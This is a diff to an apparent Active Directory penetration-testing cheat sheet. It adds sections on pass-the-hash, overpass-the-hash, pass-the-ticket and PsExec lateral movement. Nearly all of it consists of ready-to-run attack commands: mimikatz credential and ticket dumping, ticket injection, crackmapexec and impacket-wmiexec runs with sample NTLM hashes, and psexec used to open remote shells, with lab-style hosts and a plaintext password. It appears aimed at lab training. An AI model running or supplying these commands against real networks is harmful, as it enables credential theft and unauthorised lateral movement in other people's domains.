@@ -549,7 +549,7 @@ secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
 ### Password Spraying
 
 - Dump passwords from memory using mimikatz
-```bash
+```powershell
 PS C:\tmp > mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
 ```
 
@@ -581,7 +581,7 @@ crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_con
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
 
-### Pass the hash
+### Pass the hash (lateral movement) for NTLM only
 
 - Access local SAM database and dump all local hashes
 ```powershell
@@ -599,8 +599,43 @@ sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
 - Pass the hash
 
 ```bash
+#using crackmapexec on kali to access x.105 and host in 192.168.57.0/24
 crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
-        crackmapexec 192. 168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
+        crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
+
+#using wmiexec on kali
+kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+```
+
+### Overpass the hash (convert NTLM hash into a Kerberos TGT, then use TGT to obtain TGS)
+```bash
+#output is a kerberos ticket
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+
+# Checking if the forged tickets is in memory
+ps> klist
+
+#get shell
+psexec.exe -accepteula \\<remote_hostname> cmd  
+```
+
+### Pass the ticket
+```bash
+.\mimikatz.exe
+sekurlsa::tickets /export
+
+#obtain the newly generated ticket (latest timestamp)
+dir *.kirbi
+mimikatz # kerberos::ptt *[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi*
+klist
+dir \\web04\admin$
+```
+
+## PSexec (lateral movement)
+
+```powershell
+#FILE04 = target host, jen = user with access to FILES04
+./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
 ```
 
 ### Silver Tickets (Forge ticket)
